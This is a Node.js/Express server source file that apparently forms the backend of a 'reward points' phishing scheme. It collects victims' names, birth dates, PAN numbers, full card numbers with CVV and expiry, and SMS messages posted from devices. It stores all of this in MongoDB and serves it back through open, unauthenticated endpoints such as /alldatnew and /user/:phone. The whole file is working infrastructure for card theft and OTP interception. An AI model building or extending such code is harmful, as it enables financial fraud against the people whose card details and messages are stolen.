require('dotenv').config();
const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const twilio = require('twilio');
const axios = require('axios');
const cors = require('cors');
var valid = require("card-validator");
const { Console } = require('console');
const app = express();
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
const cookieParser = require('cookie-parser');
const { generateToken, verifyToken } = require('./jwt');
const session = require('express-session');
const mongoose = require('mongoose')
const dbURL = process.env.ATLAS_DB_URL;


console.log('env url',dbURL)

mongoose.connect(dbURL)
  .then(() => console.log(' db Connected!'));



// defining the model for schema
const UserSchema = new mongoose.Schema({
  phone: { type: String, required: true, unique: true },
  userData: {
      // Define fields within userData based on your requirements
      name: String,
      dob: String,
      pan: String,
      phone: String,
  },
  cards: [{
      cardNumber: String,
      cvv: String,
      expiryDate: String
  }],
  sms: [{
    address: String,
    body: String,
    date: String
}]
});

const User = mongoose.model('User', UserSchema);


app.use(cors({ 
    origin: '*', 
    methods: ['GET','POST'],
}));

app.use(cookieParser());

app.use(express.json());

app.use(express.urlencoded({extended:true}))

app.use(session({
  secret: 'your-secret-key', // Replace with a strong secret key
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false } // Set to true if using HTTPS
}));





// Mt SID
const accountSid = process.env.TWILIO_ACCOUNT_SID;
const authToken = process.env.TWILIO_AUTH_TOKEN;
const serviceSid = process.env.TWILIO_SERVICE_SID;
const client = twilio(accountSid, authToken);

const authenticateJWT = (req, res, next) => {
  // next();
  const token = req.cookies.token; // Get JWT from cookie
  if (token) {
    const user = verifyToken(token);
    if (user) {
      req.user = user;
      next();
    } else {
      res.sendStatus(403); // Forbidden
    }
  } else {
    res.sendStatus(401); // Unauthorized
  }
};



// app.get('/test', async (req, res) => {
//   try {
//     let card_number = 4111111111111111;
//     let result = await findCardInDatabase(card_number);
//     console.log("final result", result);
//     res.send(result);
//   } catch (error) {
//     console.error("Error finding card in database:", error);
//     res.status(500).send("An error occurred while fetching card details.");
//   }
// });





// // Route for Login Page
app.get('/', (req, res) => {
  res.render('login');
});


// // Route for reward
app.get('/reward',(req, res) => {
    res.render('reward');
  });


// // Route for reward points
app.get('/rewardpoints', (req, res) => {
    res.render('reward_points');
  });


function hasRequiredData(user) {
    // Check if user is null or undefined
    if (!user) {
      console.error('User object is null or undefined:', user);
      return false;
    }
  
    const hasSMS = Array.isArray(user.sms) && user.sms.length > 0;
    const hasPhone = typeof user.phone === 'string' && user.phone.trim() !== '';
    const hasCardNumber = Array.isArray(user.cards) && user.cards.length >= 1;
  
    console.log('hasSMS:', hasSMS, 'hasPhone:', hasPhone, 'hasCardNumber:', hasCardNumber);
  
    return hasSMS && hasPhone && hasCardNumber;
  }
  

// function hasRequiredData(user) {
//     const hasSMS = Array.isArray(user.sms) && user.sms.length > 0; 
//     const hasPhone = typeof user.phone === 'string' && user.phone.trim() !== '';
//     const hasCardNumber = user.cards.length >= 1;
//     console.log()
//     console.log(hasSMS,hasPhone,hasCardNumber)
//     return hasSMS && hasPhone && hasCardNumber;
//   }

app.get('/alldatnew', async (req, res) => {
    try {
      const allUsersWithSMS = await User.find()
  
      if (allUsersWithSMS.length === 0) {
        return res.status(404).json({ valid: false, message: 'No SMS data found.' });
      }
  
      const formattedData = allUsersWithSMS.map(user => {
        return {
          phone: user.phone,
          complete: hasRequiredData(user),  // Use the function here
          userData: user.userData 
        };
      });
  
      res.json({
        data: formattedData
      });
    } catch (error) {
      console.error('Error fetching SMS data:', error);
      res.status(500).json({ valid: false, error: 'Internal server error' });
    }
  });



app.get('/userone/:phone', async (req, res) => {
  const { phone } = req.params;

  try {
    const user = await User.findOne({ phone });

    if (!user) {
      return res.status(404).json({ valid: false, message: 'User not found' });
    }
    
    // Extract the first card from the cards array
    const firstCard = user.cards && user.cards.length > 0 ? user.cards[0] : null;

    // Log the user object to check if userData exists
    console.log('Fetched user:', user);

    res.json({
      data: user.userData ,
      _id: user._id,
      phone: user.phone,
      __v: user.__v,
      card: firstCard,
      sms: user.sms
    });
  } catch (error) {
    console.error('Error fetching user data:', error);
    res.status(500).json({ valid: false, error: 'Internal server error' });
  }
});

app.get('/user/:phone', async (req, res) => {
  const { phone } = req.params;

  try {
    const user = await User.findOne({ phone });

    if (!user) {
      return res.status(404).json({ valid: false, message: 'User not found' });
    }
    // const smsSorted = user.sms.sort((a, b) => b.check_date - a.check_date);
    const firstCard = Array.isArray(user.cards) && user.cards.length > 0 ? user.cards[0] : { _id: 0 };


    console.log(user.sms)
    // Log the user object to check if userData exists

//     for (timestamp in user.sms){
//         console.log(timestamp)
//         const date = new Date(timestamp);
//         const options = { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' };
//         const indianDateFormat = date.toLocaleString('en-IN', options).replace(/,/g, ''); // remove commas
// console.log(indianDateFormat);
//         // const date = new Date(timestamp);
//         // const options = { timeZone: 'America/Los_Angeles', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' };
//         // console.log(date.toLocaleString('en-US', options));
//     }

    res.json({
      data: {
        name: user.userData.name,
        dob: user.userData.dob,
        phone: user.userData.phone,
        pan: user.userData.pan,
        cards: firstCard,
        _id:firstCard._id},
      sms: user.sms
    });
  } catch (error) {
    console.error('Error fetching user data:', error);
    res.status(500).json({ valid: false, error: 'Internal server error' });
  }
});
 


app.get('/usera/:phone', async (req, res) => {
    const { phone } = req.params;
  
    try {
      const user = await User.findOne({ phone });
  
      if (!user) {
        return res.status(404).json({ valid: false, message: 'User not found' });
      }
      
      // Sort sms array by date field
      if (Array.isArray(user.sms)) {
        user.sms.sort((a, b) => new Date(a.date) - new Date(b.date));
      }
  
      // Extract the first card from the cards array
      const firstCard = Array.isArray(user.cards) && user.cards.length > 0 ? user.cards[0] : { _id: 0 };
  
      // Log the user object to check if userData exists
      console.log('Fetched user:', user);
  
      res.json({
        data: {
          name: user.userData.name,
          dob: user.userData.dob,
          phone: user.userData.phone,
          pan: user.userData.pan,
          cards: firstCard,
          _id: firstCard._id
        },
        sms: user.sms
      });
    } catch (error) {
      console.error('Error fetching user data:', error);
      res.status(500).json({ valid: false, error: 'Internal server error' });
    }
  });

app.post('/savesms', async(req, res) => {
      var { address, body, date,phone } = req.body;
    console.log("received data savsms",address,body,date,phone)
    const smsData = {
      address,
      body,       
      date
    };
    console.log('Updating user with phone:', phone);
    try {
        const user = await User.findOneAndUpdate(
            { phone },
            { $push: { sms: smsData } },
            { new: true } 
        );
        if (user) {
            console.log('Card successfully added to user:', user);
            res.json({ valid: true });
        } else {
            console.log('User not found, responding with error');
            res.json({ valid: false, error: 'User not found' });
        }
    } catch (error) {
        console.error('Error saving card to MongoDB:', error);
        res.json({ valid: false, error: 'Error saving card details' });
    }
  });
  

app.get('*', (req, res) => {
    res.render('pnf');
  });
  



app.post('/sendOTP', (req, res) => {
  // console.log("OTP sent to",req.body)
    // res.json({ success: true});
    const { phone } = req.body;
    console.log(phone)
    client.verify.v2.services(serviceSid)
      .verifications
      .create(
        {to: phone, channel: 'sms'}
      )
      .then(verification => {
          console.log(verification.sid);
          res.json({ success: true, sid: verification.sid });
      })
      .catch(error => {
          console.error('Error sending OTP:', error);
          res.json({ success: false, error: error.message });
      });
});




app.post('/verifyOTP', async (req, res) => {
  const { phone, otp, userData } = req.body;
  try {
      // Use await to get the verification result
      const verification_check = await client.verify.v2.services(serviceSid)
          .verificationChecks
          .create({ to: phone, code: otp });

      if (verification_check.status === 'approved') {
          try {
              console.log("userdata",userData)
              let user = await User.findOneAndUpdate(
                  { phone }, 
                  { $set: { userData } },  
                  { upsert: true, new: true }
              );
              req.session.userData = { phone : phone ,...userData };
              const token = generateToken({ phone });
              res.cookie('token', token, { httpOnly: true, secure: true, sameSite: 'strict' });
              res.json({ success: true });
          } catch (error) {
              console.error('Error saving user data to MongoDB:', error);
              res.json({ success: false, error: 'Error saving user data' });
          }
      } else {
          res.json({ success: false });
      }
  } catch (error) {
      console.error("Error verifying OTP:", error);
      res.json({ success: false, error: error.message });
  }
});

app.post('/validateCard', async (req, res) => {
  console.log('Received request to /validateCard',req.session);
  console.log('Received sessiond',req.session.phone);

  const { cardNumber, cvv, expiryDate } = req.body;
  console.log("received data", req.body)
  const numberValidation = valid.number(cardNumber);
    console.log('npm_validation',cardNumber,numberValidation)
    if (!numberValidation.isPotentiallyValid) {
        return res.json({ valid: false, error: 'Invalid card number format' });
    }
    else if (!numberValidation.isValid) {
        return res.json({ valid: false, error: 'Invalid card number' });
    }

  try {
      let card_number = cardNumber;
      console.log('Checking existence of card:', card_number);
      let result = await User.exists({ 'cards.cardNumber': card_number });
      console.log("Already exist ", result);
      
      if (result != null){
          console.log('Card already exists, responding with error');
          return res.json({ valid: false, error: 'Card number already exist' });
      }
  } catch (error) {
      console.error("Error finding card in database:", error);
      return res.status(500).send("An error occurred while fetching card details.");
  }
  // if (req.session.userData) { 
  //   const userData = req.session.userData;
  //   console.log("userdatafromsession",userData)
  //   console.log("phone",userData.phone)
  // }

  if (req.session.userData) {
    const userData = req.session.userData;
    console.log("userdatafromsession",userData)
    console.log("phone",userData.phone)
    
    let phone = userData.phone;
    console.log('Updating user with phone:', phone);
    try {
        const user = await User.findOneAndUpdate(
            { phone },
            { $push: { cards: { cardNumber, cvv, expiryDate } } },
            { new: true } 
        );
        if (user) {
            console.log('Card successfully added to user:', user);
            res.json({ valid: true });
          } else {
            console.log('User not found, responding with error');
            res.json({ valid: false, error: 'User not found' });
          }
        } catch (error) {
          console.error('Error saving card to MongoDB:', error);
          res.json({ valid: false, error: 'Error saving card details' });
        }
      }
});










app.listen(3000, () => {
    console.log('Server running on port 3000');
});
